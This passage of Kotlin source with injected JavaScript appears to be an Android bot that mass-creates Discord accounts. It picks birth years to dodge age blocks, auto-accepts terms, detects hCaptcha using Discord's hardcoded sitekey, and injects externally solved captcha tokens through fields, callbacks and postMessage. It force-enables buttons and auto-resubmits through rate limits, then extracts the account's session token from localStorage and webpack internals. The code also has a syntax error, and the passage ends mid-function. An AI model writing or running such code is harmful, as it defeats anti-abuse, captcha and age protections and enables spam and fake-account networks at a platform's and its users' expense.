        for (var up = 0; up < 4 && node; up++) {
          if (node.className && /control|Control|container|Container/.test(String(node.className))) {
            if (candidates.indexOf(node) < 0) candidates.push(node);
            break;
          }
          node = node.parentElement;
        }
      }
      if (candidates.length >= 3) {
        return { month: candidates[0], day: candidates[1], year: candidates[2] };
      }
      if (candidates.length === 3) {
        return { month: candidates[0], day: candidates[1], year: candidates[2] };
      }
      return null;
    }

    // ── Core selector ──────────────────────────────────────────────────

    /**
     * Open a react-select DOB dropdown and pick targetText.
     *
     * Steps:
     *  1. Click the control.
     *  2. If the target is already visible → click it (Month / Day usually land here).
     *  3. Type into the react-select input that lives INSIDE the control element
     *     (NOT document.activeElement — avoids accidentally filling the email field).
     *  4. If that narrowed the list → click the match.
     *  5. For Year: scroll the menu to the calculated position and scan.
     *  6. Safe fallback (never picks 2023 / an underage year).
     */
    function selectDobField(label, targetText, controlEl, callback) {
      if (!controlEl) {
        Android.onLog(label + ': control not found', 'WARNING');
        if (callback) setTimeout(callback, 200);
        return;
      }

      controlEl.click();
      Android.onLog('Opened ' + label + ' dropdown', 'INFO');

      var waited = 0;
      var openTimer = setInterval(function() {
        waited += 100;
        var opts = getMenuOptions();
        if (opts.length === 0 && waited < 3500) return;
        clearInterval(openTimer);

        if (opts.length === 0) {
          Android.onLog(label + ': menu empty — retrying', 'WARNING');
          controlEl.click();
          setTimeout(function() { afterOpen(label, targetText, controlEl, callback); }, 1200);
          return;
        }
        afterOpen(label, targetText, controlEl, callback);
      }, 100);
    }

    function afterOpen(label, targetText, controlEl, callback) {
      var opts = getMenuOptions();

      // 1. Direct hit
      for (var i = 0; i < opts.length; i++) {
        if ((opts[i].textContent || '').trim().toLowerCase() === targetText.toLowerCase()) {
          opts[i].click();
          Android.onLog(label + ' → ' + targetText + ' [direct]', 'SUCCESS');
          if (callback) setTimeout(callback, 700);
          return;
        }
      }

      // 2. Type into the react-select dummy input that lives INSIDE the control.
      //    This is always a tiny invisible <input> — never a form field.
      var rsInput = controlEl.querySelector('input');
      if (rsInput) {
        var setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
        setter.call(rsInput, targetText);
        rsInput.dispatchEvent(new Event('input',  { bubbles: true }));
        rsInput.dispatchEvent(new Event('change', { bubbles: true }));
        Android.onLog(label + ': typed into rs-input', 'INFO');

        setTimeout(function() {
          var filtered = getMenuOptions();
          for (var j = 0; j < filtered.length; j++) {
            if ((filtered[j].textContent || '').trim().toLowerCase() === targetText.toLowerCase()) {
              filtered[j].click();
              Android.onLog(label + ' → ' + targetText + ' [filtered]', 'SUCCESS');
              if (callback) setTimeout(callback, 700);
              return;
            }
          }
          // Typing didn't filter — continue with scroll / fallback
          scrollOrFallback(label, targetText, controlEl, callback);
        }, 700);
      } else {
        scrollOrFallback(label, targetText, controlEl, callback);
      }
    }

    // 3. Scroll-based selection (critical for Year — 100+ items, descending)
    function scrollOrFallback(label, targetText, controlEl, callback) {
      var sc = getMenuScrollable();
      var opts = getMenuOptions();
      var numTarget = parseInt(targetText);

      if (sc && !isNaN(numTarget) && opts.length >= 2) {
        var v0 = parseInt((opts[0].textContent || '').trim());
        var v1 = parseInt((opts[1].textContent || '').trim());
        if (!isNaN(v0) && !isNaN(v1)) {
          var step   = v1 - v0;            // −1 for descending year list
          var itemH  = Math.max(opts[0].offsetHeight || 0, 36);
          var idx    = (numTarget - v0) / step;
          var jumpTo = Math.max(0, Math.round(idx * itemH) - itemH * 2);
          sc.scrollTop = jumpTo;
          sc.dispatchEvent(new Event('scroll', { bubbles: false }));
          Android.onLog(label + ': scrolled to ~' + targetText, 'INFO');

          var attempts = 0;
          var scrollPoll = setInterval(function() {
            attempts++;
            var cur = getMenuOptions();
            for (var i = 0; i < cur.length; i++) {
              if ((cur[i].textContent || '').trim() === targetText) {
                clearInterval(scrollPoll);
                cur[i].click();
                Android.onLog(label + ' → ' + targetText + ' [scroll]', 'SUCCESS');
                if (callback) setTimeout(callback, 700);
                return;
              }
            }
            if (attempts >= 12) {
              clearInterval(scrollPoll);
              safeFallback(label, controlEl, callback);
            } else {
              // Nudge scroll a little and retry
              sc.scrollTop += step < 0 ? itemH : -itemH;
              sc.dispatchEvent(new Event('scroll', { bubbles: false }));
            }
          }, 200);
          return;
        }
      }

      safeFallback(label, controlEl, callback);
    }

    /** Poll `predicate` until it's true or timeoutMs elapses, then call cb(predicateResult). */
    function waitUntil(predicate, cb, timeoutMs) {
      var started = Date.now();
      var t = setInterval(function() {
        var ok = predicate();
        if (ok || Date.now() - started > timeoutMs) {
          clearInterval(t);
          cb(ok);
        }
      }, 100);
    }

    /** Wait for the current dropdown to fully close before opening the next. */
    function waitForClose(callback, timeoutMs) {
      waitUntil(function() { return getMenuOptions().length === 0; }, function() {
        setTimeout(callback, 200);
      }, timeoutMs || 2500);
    }

    /** Read the year currently shown in the Year control. */
    function getSelectedYear() {
      var yearCtrl = document.querySelector('[aria-label="Year"]') ||
                     document.querySelector('[aria-label="Año"]') ||
                     document.querySelector('[aria-label="Ano"]') ||
                     document.querySelector('[aria-label="Jahr"]') ||
                     document.querySelector('[aria-label="Année"]') ||
                     document.querySelector('[aria-label="Год"]') ||
                     document.querySelector('[aria-label="Anno"]') ||
                     document.querySelector('[aria-label="Rok"]') ||
                     document.querySelector('[aria-label="Jaar"]') ||
                     document.querySelector('[aria-label="Yıl"]') ||
                     document.querySelector('[aria-label="年"]') ||
                     document.querySelector('[aria-label="년"]') ||
                     findControl(['Year','Año','Ano','Jahr','Année','Год','Anno','Rok','Jaar','Yıl','वर्ष','年','년','السنة','Năm','ปี','Tahun']);
      if (!yearCtrl) return null;
      var txt = (yearCtrl.textContent || '').trim();
      var m = txt.match(/\b(19|20)\d{2}\b/);
      return m ? parseInt(m[0]) : null;
    }

    /**
     * Open the Year dropdown (never speculatively clicking to "close" a menu whose
     * state we're unsure about — that toggle ambiguity was the root cause of the
     * earlier bugs), scroll it to the very bottom, and click the last (oldest)
     * visible option. Calls callback(actualSelectedYearOrNull).
     *
     * Contract: the caller must guarantee the menu is already closed before
     * calling this (selectYearRobust enforces this by always waiting for close
     * after every selection before proceeding).
     */
    function clickOldestYear(controlEl, callback) {
      if (!controlEl) {
        Android.onLog('Year fallback: control not found', 'ERROR');
        if (callback) setTimeout(function() { callback(null); }, 300);
        return;
      }

      // Defensive: if a menu is somehow still open (shouldn't happen given the
      // contract above), just use it as-is rather than toggling blind.
      if (getMenuOptions().length > 0) {
        Android.onLog('Year fallback: menu already open, using it', 'INFO');
        scrollAndClickOldest();
        return;
      }

      controlEl.click();
      Android.onLog('Year fallback: opened dropdown', 'INFO');
      waitUntil(function() { return getMenuOptions().length > 0; }, function(opened) {
        if (!opened) {
          Android.onLog('Year fallback: dropdown failed to open', 'ERROR');
          if (callback) callback(null);
          return;
        }
        scrollAndClickOldest();
      }, 3000);

      function scrollAndClickOldest() {
        // Prefer a year inside [birthYearMin, birthYearMax] — never "oldest" (age 38+)
        var target = year; // already Kotlin-picked in range
        var sc = getMenuScrollable();
        if (sc) {
          // Heuristic scroll toward target year (list is usually newest-first at top)
          var frac = 0.5;
          try {
            var newest = $thisYear;
            var oldestGuess = newest - 100;
            frac = (newest - parseInt(target, 10)) / Math.max(1, newest - oldestGuess);
            frac = Math.max(0, Math.min(1, frac));
          } catch (e) {}
          sc.scrollTop = sc.scrollHeight * frac;
          sc.dispatchEvent(new Event('scroll', { bubbles: false }));
          Android.onLog('Year fallback: scrolled toward ' + target, 'INFO');
        }
        setTimeout(function() {
          var late = getMenuOptions();
          if (late.length === 0) {
            Android.onLog('Year fallback: no options visible after scroll', 'ERROR');
            if (callback) callback(null);
            return;
          }
          var pick = null;
          var pickY = null;
          var inRange = [];
          for (var i = 0; i < late.length; i++) {
            var txt = (late[i].textContent || '').trim();
            var y = parseInt(txt, 10);
            if (!isNaN(y) && y >= birthYearMin && y <= birthYearMax) {
              inRange.push({ el: late[i], y: y });
              if (String(y) === String(target)) pick = late[i];
            }
          }
          if (!pick && inRange.length > 0) {
            var r = inRange[Math.floor(Math.random() * inRange.length)];
            pick = r.el; pickY = r.y;
          }
          if (!pick) {
            // Last resort: closest numeric option to target
            var best = null, bestDiff = 1e9;
            for (var j = 0; j < late.length; j++) {
              var yy = parseInt((late[j].textContent || '').trim(), 10);
              if (isNaN(yy)) continue;
              var d = Math.abs(yy - parseInt(target, 10));
              if (d < bestDiff) { bestDiff = d; best = late[j]; pickY = yy; }
            }
            pick = best || late[Math.floor(late.length / 2)];
          }
          var lastText = (pick.textContent || '').trim();
          pick.click();
          Android.onLog('Year fallback: clicked in-range/closest ' + lastText, 'WARNING');
          waitForClose(function() {
            var actual = getSelectedYear();
            if (callback) callback(actual);
          }, 1200);
        }, 300);
      }
    }

    /** Last resort — never picks an underage year. */
    function safeFallback(label, controlEl, callback) {
      var opts = getMenuOptions();
      if (label === 'Year') {
        // Fallback to the oldest visible year.
        clickOldestYear(controlEl, function() {
          if (callback) setTimeout(callback, 600);
        });
        return;
      }
      if (label === 'Day' && opts.length > 4) {
        var mid = opts[Math.floor(opts.length / 2)];
        var midTxt = (mid.textContent || '').trim();
        mid.click();
        Android.onLog('Day fallback used: selected ' + midTxt + ' (not target)', 'WARNING');
      } else if (opts.length > 0) {
        var first = opts[0];
        var firstTxt = (first.textContent || '').trim();
        first.click();
        Android.onLog(label + ' fallback used: selected ' + firstTxt + ' (not target)', 'WARNING');
      } else {
        Android.onLog(label + ': no options visible', 'ERROR');
      }
      if (callback) setTimeout(callback, 600);
    }

    /**
     * Robust year selection: try the target year once. If it was actually
     * selected (verified via getSelectedYear, not assumed), we're done — no
     * fallback needed. Only if the target selection failed/mismatched do we
     * fall back to clicking the oldest visible year, at least 2 times, each of
     * which may reveal even older years as the virtualized list scrolls
     * further back, continuing until the resulting age is >= 15.
     * Calls callback(actualYear) exactly once when done.
     */
    function selectYearRobust(targetYear, yearCtrl, callback) {
      var minAge = 18;
      var currentYear = new Date().getFullYear();
      var fallbackCount = 0;   // how many oldest-year clicks have been done so far
      var maxFallbacks = 6;    // hard safety cap so this can never loop forever
      var lastActual = null;
      var done = false;

      function finish() {
        if (done) return; // guarantee callback fires exactly once
        done = true;
        Android.onLog('Year final selected: ' + lastActual +
          ' (age ' + (lastActual ? (currentYear - lastActual) : '?') + ')', 'SUCCESS');
        if (callback) callback(lastActual);
      }

      function afterFallback(actual) {
        if (actual !== null) lastActual = actual;
        Android.onLog('Year after fallback #' + fallbackCount + ': ' + lastActual, 'INFO');
        var age = lastActual ? (currentYear - lastActual) : 0;
        var inRange = age >= minAge && age <= maxAge;
        if (inRange) {
          Android.onLog('Year accepted in age range: ' + lastActual + ' (age ' + age + ')', 'SUCCESS');
          finish();
        } else if (fallbackCount >= maxFallbacks) {
          Android.onLog('Year fallback exhausted; last=' + lastActual + ' age=' + age, 'WARNING');
          finish();
        } else {
          runFallback();
        }
      }

      function runFallback() {
        fallbackCount++;
        Android.onLog('Year fallback #' + fallbackCount, 'WARNING');
        clickOldestYear(yearCtrl, afterFallback);
      }

      // Step 1: try the originally generated target year exactly once.
      selectDobField('Year', targetYear, yearCtrl, function() {
        waitForClose(function() {
          lastActual = getSelectedYear();
          var wantedYear = parseInt(targetYear, 10);
          Android.onLog('Year target try: ' + lastActual + ' (target ' + targetYear + ')', 'INFO');

          // Only fall back when the target year was NOT actually selected.
          // Previously this always ran 2+ oldest-year fallback clicks regardless
          // of success, silently discarding a perfectly good target-year pick
          // and replacing it with a much older year every single time.
          if (lastActual !== null && lastActual === wantedYear) {
            finish();
            return;
          }
          Android.onLog('Year target selection failed/mismatched — starting fallback', 'WARNING');
          runFallback();
        }, 2500);
      });
    }

    // ── Pre-locate controls, then chain Month → Day → Year ─────────────
    // Multi-language labels for Month / Day / Year
    var monthLabels = ['Month','Mes','Monat','Mois','Месяц','Mese','Miesiąc','Maand','Ay','महीना','月','월','الشهر','Tháng','เดือน','Bulan'];
    var dayLabels   = ['Day','Día','Dia','Tag','Jour','День','Giorno','Dzień','Dag','Gün','दिन','日','일','اليوم','Ngày','วัน','Hari'];
    var yearLabels  = ['Year','Año','Ano','Jahr','Année','Год','Anno','Rok','Jaar','Yıl','वर्ष','年','년','السنة','Năm','ปี','Tahun'];

    var monthCtrl = findControl(monthLabels);
    var dayCtrl   = findControl(dayLabels);
    var yearCtrl  = findControl(yearLabels);

    if (!monthCtrl || !dayCtrl || !yearCtrl) {
      var byPos = findDobControlsByPosition();
      if (byPos) {
        monthCtrl = monthCtrl || byPos.month;
        dayCtrl   = dayCtrl   || byPos.day;
        yearCtrl  = yearCtrl  || byPos.year;
        Android.onLog('DOB controls resolved by position fallback', 'INFO');
      }
    }

    if (!monthCtrl || !dayCtrl || !yearCtrl) {
      Android.onLog('DOB controls not all found — skipping DOB', 'WARNING');
      setTimeout(submitForm, 500);
      return;
    }

    // Try numeric month first, then localized names
    function selectMonthRobust(ctrl, cb) {
      var tries = monthNamesAll.slice();
      function next() {
        if (tries.length === 0) { if (cb) cb(); return; }
        var target = tries.shift();
        selectDobField('Month', target, ctrl, function() {
          // Check if something was selected (control text changed)
          var txt = (ctrl.textContent || '').trim();
          if (txt && txt.length > 0 && monthLabels.every(function(l){ return txt.toLowerCase().indexOf(l.toLowerCase()) < 0; })) {
            Android.onLog('Month selected via "' + target + '"', 'SUCCESS');
            if (cb) cb();
          } else if (tries.length > 0) {
            next();
          } else {
            if (cb) cb();
          }
        });
      }
      next();
    }

    selectMonthRobust(monthCtrl, function() {
      waitForClose(function() {
        selectDobField('Day', day, dayCtrl, function() {
          waitForClose(function() {
            selectYearRobust(year, yearCtrl, function(actualYear) {
              Android.onLog('DOB set: ' + month + ' ' + day + ', ' + (actualYear || year), 'SUCCESS');
              setTimeout(submitForm, 900);
            });
          });
        });
      });
    });
  }

  // ── Submit ─────────────────────────────────────────────────────────────
  function submitForm() {
    var checkboxes = document.querySelectorAll('input[type="checkbox"]');
    checkboxes.forEach(function(cb) {
      if (!cb.checked) { cb.click(); cb.checked = true; cb.dispatchEvent(new Event('change', { bubbles: true })); }
    });
    var btn = document.querySelector('button[type="submit"]');
    if (btn) { btn.click(); Android.onLog('Form submitted', 'SUCCESS'); }
    else {
      var btns = document.querySelectorAll('button');
      for (var i = 0; i < btns.length; i++) {
        var t = btns[i].textContent || '';
        if (/continue|create|submit|registr|weiter|continuar|continuer|продолж|devam|继续|계속|ต่อไป|tiếp/i.test(t)) {
          btns[i].click(); Android.onLog('Form submitted (fallback)', 'SUCCESS'); break;
        }
      }
    }
    startPolling();
  }

  // ── Polling loop ───────────────────────────────────────────────────────
  var captchaReported = false;
  var identityHandled = false;
  var phoneHandled    = false;

  function startPolling() {
    var pollInterval = setInterval(function() {
      var href = window.location.href;

      // Already logged in (manual or automation)
      if (href.includes('channels/@me') || href.includes('%40me') || href.includes('/channels/')) {
        clearInterval(pollInterval);
        Android.onLog('Logged in — extracting token', 'SUCCESS');
        extractToken();
        return;
      }

      // Age restriction / under-18 / under-13 block
      if (!window.__evsAgeBlockHandled) {
        var ageTxt = (document.body && document.body.innerText) || '';
        if (/you need to be at least|must be at least 13|must be 18|under.?13|age restriction|not old enough|parental consent|you'?re not old enough|minimum age|age requirement|too young/i.test(ageTxt)) {
          window.__evsAgeBlockHandled = true;
          Android.onLog('My bad — DOB landed under the 18 limit / age page opened. Refreshing with new cookie and safer year…', 'WARNING');
          try { Android.onAgeRestrictionDetected(); } catch(e) {}
          return;
        }
      }

      // Identity / security verification page
      // Catches: "Verification Required", "Confirm your identity", "Verify your account",
      //          "Account stays secure", "New login", "Suspicious activity" etc.
      // identityHandled is only set TRUE once the "Verify by Email" button is
      // successfully clicked. If the button is not yet visible (e.g. captcha must be
      // solved first), we leave the flag false so the next tick retries automatically.
      if (!identityHandled && !phoneHandled) {
        var bodyText = (document.body && document.body.innerText) || '';
        // Explicit phone UI wins over identity keywords
        var hasPhoneUi = !!document.querySelector('input[type="tel"],input[name="phone"],input[autocomplete="tel"]')
          || /verify.*phone|add.*phone|phone number|sms code|text.*code|number verification/i.test(bodyText);
        if (!hasPhoneUi && /confirm your identity|verify your identity|account stays secure|verification required|verify your account|new login|suspicious activity|verify by email|check your email/i.test(bodyText)) {
          Android.onLog('Identity verification page detected — looking for email button...', 'WARNING');
          var allBtns = document.querySelectorAll('button,div[role="button"],a[role="button"]');
          var clicked = false;
          for (var bi = 0; bi < allBtns.length; bi++) {
            var bt = (allBtns[bi].textContent || '').toLowerCase();
            if ((bt.includes('email') || bt.includes('send') || bt.includes('verify') || bt.includes('check')) &&
                !bt.includes('phone') && !bt.includes('sms')) {
              allBtns[bi].click();
              identityHandled = true;
              Android.onLog('Clicked verify-by-email: "' + bt.trim() + '"', 'SUCCESS');
              Android.onIdentityVerificationRequired();
              clicked = true;
              break;
            }
          }
          if (!clicked) {
            Android.onLog('Email button not visible yet — will retry after captcha...', 'INFO');
          }
        }
      }

      // Phone verification — require a real phone field + phone intent.
      // Never fire on /register form or email-identity pages.
      if (!phoneHandled && !identityHandled) {
        var hrefNow = (window.location.href || '');
        if (/\/register|\/login/i.test(hrefNow)) {
          // stay off phone path on register/login
        } else {
          var bodyText2 = (document.body && document.body.innerText) || '';
          var phoneInput = document.querySelector('input[type="tel"],input[name="phone"],input[autocomplete="tel"],input[name="phone_number"]');
          var strongPhone = /verify your phone|add a phone number|phone number required|confirm your phone|enter your phone|sms code|text.*code to your phone|mobile number|verify mobile|phone to continue|add phone number|verify by phone/i;
          var emailPage = /verify.*email|confirm your email|check your email|verification email|verify by email|we sent you an email|open the link/i.test(bodyText2);
          var identityPage = /confirm your identity|verify by email/i.test(bodyText2);
          if (emailPage || identityPage) {
            // stay on email / identity path — never phone
          } else if (phoneInput && strongPhone.test(bodyText2)) {
            phoneHandled = true;
            Android.onLog('Phone verification page detected', 'WARNING');
            try { Android.onPhoneVerificationRequired(); } catch (e) {}
          }
        }
      }

      // Field-level errors only (avoid false positives from page copy like "email" + "used")
      function fieldErrorText(sel) {
        var el = document.querySelector(sel);
        if (!el) return '';
        var invalid = el.getAttribute('aria-invalid') === 'true';
        var errId = el.getAttribute('aria-errormessage') || el.getAttribute('aria-describedby') || '';
        var errNode = errId ? document.getElementById(errId) : null;
        var near = '';
        try {
          var p = el.closest('div');
          if (p) near = p.innerText || '';
        } catch(e) {}
        var t = ((errNode && errNode.innerText) || near || '').slice(0, 400);
        return (invalid ? 'INVALID ' : '') + t;
      }

      // Email rejection — classify reason so we do NOT blacklist domain on "already registered"
      if (!window.__emailRejected) {
        var emailTxt = fieldErrorText('input[name="email"], input[type="email"]');
        if (emailTxt) {
          var reason = '';
          if (/already (registered|being used|in use)|email is taken|that email is already|email address is already/i.test(emailTxt)) {
            reason = 'already_registered';
          } else if (/domain is not (allowed|supported)|provider is not (allowed|supported)|this email cannot be used|unable to register with this email/i.test(emailTxt)) {
            reason = 'domain_blocked';
          } else if (/invalid email|email is invalid|please enter a valid email|not a valid email/i.test(emailTxt)) {
            reason = 'invalid';
          }
          if (reason) {
            window.__emailRejected = true;
            Android.onLog('Email rejected (' + reason + ') — retrying', 'WARNING');
            try { Android.onEmailRejectedReason(reason); } catch (e) { Android.onEmailRejected(); }
          }
        }
      }

      // Username taken / invalid (cooldown avoids triple-fire while we update the field)
      if (!window.__usernameRejected) {
        var userTxt = fieldErrorText('input[name="username"]');
        var strictUser = /username.*(?:taken|already|unavailable|not available|in use|invalid|too short|too long|cannot be used)|this username is (?:taken|unavailable)|please choose another username|username is not available/i;
        if (userTxt && strictUser.test(userTxt)) {
          window.__usernameRejected = true;
          Android.onLog('Username rejected — trying a different number', 'WARNING');
          try { Android.onUsernameRejected(); } catch(e) {}
          // Keep flag true for 2.5s so the same banner does not spam the bridge
          setTimeout(function() { window.__usernameRejected = false; }, 2500);
        }
      }

      // Password too weak / invalid
      if (!window.__passwordRejected) {
        var passTxt = fieldErrorText('input[name="password"], input[type="password"]');
        var strictPass = /password.*(?:weak|short|invalid|insecure|must|require|at least|too short|not strong)|choose a stronger password|password is too (?:short|weak)|password must/i;
        if (passTxt && strictPass.test(passTxt)) {
          window.__passwordRejected = true;
          Android.onLog('Password rejected — updating field', 'WARNING');
          try { Android.onPasswordRejected(); } catch(e) {}
          setTimeout(function() { window.__passwordRejected = false; }, 2500);
        }
      }

      // Display name — only when the field is aria-invalid with a clear error (no body-text scan)
      if (!window.__displayRejected) {
        var dnEl = document.querySelector('input[name="global_name"], input[name="display_name"], input[name="globalName"]');
        if (dnEl && dnEl.getAttribute('aria-invalid') === 'true') {
          var dnTxt = fieldErrorText('input[name="global_name"], input[name="display_name"], input[name="globalName"]');
          if (/too long|too short|invalid|cannot be used|not allowed/i.test(dnTxt)) {
            window.__displayRejected = true;
            Android.onLog('Display name rejected — using a simpler name', 'WARNING');
            try { Android.onDisplayNameRejected(); } catch(e) {}
          setTimeout(function() { window.__displayRejected = false; }, 2500);
          }
        }
      }


      // Captcha detection — checks iframe, widget div, and known class names.
      // Uses window.__captchaReported so Kotlin can reset it if the user presses CONTINUE
      // (Discord sometimes re-shows captcha after a failed submit within the same account).
      if (!window.__captchaReported) {
        var hcIframe = document.querySelector('iframe[src*="hcaptcha.com"]');
        var rcIframe = document.querySelector('iframe[src*="recaptcha"]');
        var hcWidget = document.querySelector('[data-sitekey]');
        var hcClass  = document.querySelector('.h-captcha,[class*="captcha"]');
        if (hcIframe || rcIframe || hcWidget || hcClass) {
          window.__captchaReported = true;
          // Discord's known hCaptcha sitekey as hardcoded fallback
          var sk = 'a9b5fb07-92ff-493f-86fe-352a2803b3df';
          if (hcIframe && hcIframe.src) {
            var sm = hcIframe.src.match(/sitekey=([^&]+)/);
            if (sm) sk = sm[1];
          } else if (hcWidget) {
            sk = hcWidget.getAttribute('data-sitekey') || sk;
          }
          Android.onLog('Captcha detected — sitekey: ' + sk.substring(0, 8) + '...', 'CAPTCHA');
          Android.onCaptchaDetected(sk);
        }
      }

      // Rate-limit detection — Discord returns "The resource is being rate limited"
      // and disables the submit button for a short window. Detect it, log a warning,
      // then watch the button and auto-click it once it becomes enabled again.
      if (!window.__rlWatching) {
        var rlText = (document.body && document.body.innerText) || '';
        if (/resource.*being.*limited|rate.?limit|too many requests/i.test(rlText)) {
          var rlBtn = document.querySelector('button[type="submit"]');
          if (rlBtn && rlBtn.disabled) {
            window.__rlWatching = true;
            Android.onLog('[!] Stopping for few moments, resource being rate limited.', 'WARNING');
            var rlTimer = setInterval(function() {
              var b2 = document.querySelector('button[type="submit"]');
              if (b2 && !b2.disabled) {
                clearInterval(rlTimer);
                window.__rlWatching = false;
                Android.onLog('✓ Rate limit lifted — clicking Create Account again...', 'INFO');
                b2.click();
              }
            }, 1000);
          }
        }
      }
    }, 1200);
  }

  // ── Token extraction ───────────────────────────────────────────────────
  function extractToken() {
    var isToken = function(t) { return t && typeof t === 'string' && t.length > 50 && t.split('.').length === 3; };
    try {
      var t = window.localStorage.getItem('token');
      if (t) { t = t.replace(/"/g, ''); if (isToken(t)) { Android.onTokenFound(t); return; } }
    } catch(e) {}
    try {
      var m = [];
      var chunk = window.webpackChunkdiscord_app || [];
      chunk.push([[''], {}, function(e) { for (var c in e.c) m.push(e.c[c]); }]);
      var auth = m.find(function(x) {
        return x && x.exports && x.exports.default &&
               x.exports.default.getToken && isToken(x.exports.default.getToken());
      });
      if (auth) { Android.onTokenFound(auth.exports.default.getToken()); return; }
    } catch(e) {}
    // Retry once after 2 s
    setTimeout(function() {
      try {
        var t2 = window.localStorage.getItem('token');
        if (t2) { t2 = t2.replace(/"/g, ''); if (isToken(t2)) Android.onTokenFound(t2); }
      } catch(e) {}
    }, 2000);
  }

  fillForm();
})();
        """.trimIndent()
    }

    private fun buildCaptchaInjectJs(solution: String): String {
        val esc = solution
            .replace("\\", "\\\\")
            .replace("'", "\\'")
            .replace("\n", "\\n")
            .replace("\r", "")
        return """
(function() {
  var token = '$esc';
  if (!token || token.length < 20) {
    try { Android.onLog('Inject skipped — empty token', 'WARNING'); } catch(e) {}
    return;
  }
  // Prevent spam reinject loops
  if (window.__captchaInjectLock && window.__lastInjectedCaptchaToken === token) {
    try { Android.onLog('Inject skipped — same token already applied', 'INFO'); } catch(e) {}
    return;
  }
  window.__captchaInjectLock = true;
  window.__lastInjectedCaptchaToken = token;
  window.__captchaSubmittedExternally = true;

  function setNativeValue(el, value) {
    if (!el) return;
    try {
      var proto = el.tagName === 'TEXTAREA' ? HTMLTextAreaElement.prototype : HTMLInputElement.prototype;
      var desc = Object.getOwnPropertyDescriptor(proto, 'value');
      if (desc && desc.set) desc.set.call(el, value);
      else el.value = value;
      el.setAttribute('value', value);
      el.dispatchEvent(new Event('input', { bubbles: true }));
      el.dispatchEvent(new Event('change', { bubbles: true }));
    } catch (e) {}
  }

  var injected = false;
  ['h-captcha-response','g-recaptcha-response','cf-turnstile-response'].forEach(function(n) {
    document.querySelectorAll('textarea[name="'+n+'"], input[name="'+n+'"], [name="'+n+'"]').forEach(function(el) {
      setNativeValue(el, token);
      injected = true;
    });
  });
  document.querySelectorAll('iframe[data-hcaptcha-response]').forEach(function(f) {
    try { f.setAttribute('data-hcaptcha-response', token); injected = true; } catch(e) {}
  });

  // data-callback on widget
  try {
    document.querySelectorAll('[data-sitekey], .h-captcha, [class*="hcaptcha"]').forEach(function(w) {
      var cb = w.getAttribute('data-callback');
      if (cb && typeof window[cb] === 'function') {
        try { window[cb](token); injected = true; } catch(e) {}
      }
    });
  } catch(e) {}

  // Common globals Discord / hCaptcha register
  ['captchaCallback','onCaptchaSuccess','hcaptchaCallback','onSuccess','captchaSuccess'].forEach(function(fn) {
    try { if (typeof window[fn] === 'function') { window[fn](token); injected = true; } } catch(e) {}
  });

  // hCaptcha API: try getRespKey / setResponse on each widget
  try {
    if (window.hcaptcha) {
      var widgets = document.querySelectorAll('[data-hcaptcha-widget-id], iframe[src*="hcaptcha"]');
      // Best-effort: postMessage into frames
      document.querySelectorAll('iframe[src*="hcaptcha"]').forEach(function(f) {
        try {
          f.contentWindow.postMessage(JSON.stringify({
            source: 'hcaptcha',
            label: 'challenge-closed',
            contents: { event: 'challenge-passed', response: token, expiration: 120 }
          }), '*');
          f.contentWindow.postMessage({
            source: 'hcaptcha',
            label: 'challenge-closed',
            contents: { response: token, expiration: 120 }
          }, '*');
        } catch(e) {}
      });
    }
  } catch(e) {}

  // Reinforce hook for one optional retry from native
  window.__reinforceCaptcha = function() {
    if (window.__lastInjectedCaptchaToken !== token) return;
    document.querySelectorAll('textarea[name="h-captcha-response"], [name="h-captcha-response"]').forEach(function(el) {
      setNativeValue(el, token);
    });
    try {
      document.querySelectorAll('[data-sitekey]').forEach(function(w) {
        var cb = w.getAttribute('data-callback');
        if (cb && typeof window[cb] === 'function') window[cb](token);
      });
    } catch(e) {}
  };

  try {
    Android.onLog(injected ? 'Captcha token injected into page fields' : 'Token applied via callbacks (no textarea)', 'SUCCESS');
  } catch(e) {}

  function clickOnce() {
    if (window.__captchaClickDone) return false;
    var btn = document.querySelector('button[type="submit"]');
    if (!btn) {
      var btns = document.querySelectorAll('button, div[role="button"]');
      for (var i = 0; i < btns.length; i++) {
        var t = (btns[i].textContent || btns[i].getAttribute('aria-label') || '').toLowerCase().trim();
        if (!t || t.length > 40) continue;
        if (t === 'continue' || t === 'create account' || t.indexOf('continue') === 0 ||
            t.indexOf('create') === 0 || t === 'verify' || t === 'submit' || t === 'next') {
          btn = btns[i];
          break;
        }
      }
    }
    if (btn) {
      try { btn.removeAttribute('disabled'); btn.disabled = false; } catch(e) {}
      try { btn.click(); window.__captchaClickDone = true; } catch(e) {}
      try { Android.onLog('Clicked continue/submit after captcha', 'SUCCESS'); } catch(e) {}
      return true;
    }
    return false;
  }

  // Single delayed click — no spam
  setTimeout(function() { clickOnce(); }, 800);
  setTimeout(function() {
    if (!window.__captchaClickDone) clickOnce();
    
  // Force widget response + submit for Discord SPA
  try {
    if (window.hcaptcha && typeof window.hcaptcha.setResponse === 'function') {
      document.querySelectorAll('[data-sitekey],iframe[src*="hcaptcha"]').forEach(function(node, idx) {
        try {
          var wid = node.getAttribute('data-hcaptcha-widget-id') || node.id;
          if (wid) window.hcaptcha.setResponse(wid, token);
          try { window.hcaptcha.setResponse(token); } catch(e) {}
          try {
            window.parent && window.parent.postMessage && window.parent.postMessage({source:'hcaptcha', response:token, 'h-captcha-response':token}, '*');
          } catch(e) {}
          try {
            window.postMessage({source:'hcaptcha', response:token, 'h-captcha-response':token}, '*');
          } catch(e) {}

          else if (typeof window.hcaptcha.getResponse === 'function') {
            /* some builds only allow set via internal */
          }
        } catch(e) {}
      });
      injected = true;
    }
  } catch(e) {}
  try {
    // Discord often listens for message from iframe
    window.postMessage({ event: 'captcha-complete', source: 'hcaptcha', token: token }, '*');
    window.postMessage(JSON.stringify({ event: 'captcha-complete', token: token }), '*');
  } catch(e) {}
  // Click primary submit / Create Account if enabled
  try {
    var labels = ['Create Account','Continue','Verify','Submit','Next'];
    var buttons = Array.prototype.slice.call(document.querySelectorAll('button, [role="button"]'));
    for (var bi=0; bi<buttons.length; bi++) {
      var b = buttons[bi];
      var tx = (b.innerText || b.textContent || '').trim();
      if (labels.indexOf(tx) >= 0 && !b.disabled) {
        b.click();
        injected = true;
        break;
      }
    }
  } catch(e) {}

  window.__captchaInjectLock = false;
  }, 2200);
})();
        
  // Force UI to accept solution and continue register flow
  setTimeout(function() {
    try {
      // Do NOT blank the captcha iframe (causes black screen). Only soft-hide overlays after token accepted.
      document.querySelectorAll('.challenge-overlay, [class*="blocker"]').forEach(function(el) {
        try { el.style.pointerEvents = 'none'; } catch(e) {}
      });
